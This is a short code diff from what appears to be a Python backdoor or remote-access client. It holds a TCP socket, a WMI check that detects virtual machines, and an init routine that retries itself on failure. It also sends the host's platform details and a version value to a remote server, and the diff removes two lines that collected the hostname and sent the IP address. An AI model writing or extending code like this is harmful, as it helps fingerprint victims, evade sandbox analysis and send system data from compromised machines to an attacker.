@@ -1,5 +1,4 @@
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-username = str(socket.getfqdn())
 def vmDetect():
     strComputer = "."
     objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
@@ -29,7 +28,6 @@ def init():
     except:
         init()
 init()
-s.send(socket.gethostbyname(socket.gethostname()))
 s.send(platform())
 sleep(1)
 s.send(V2)
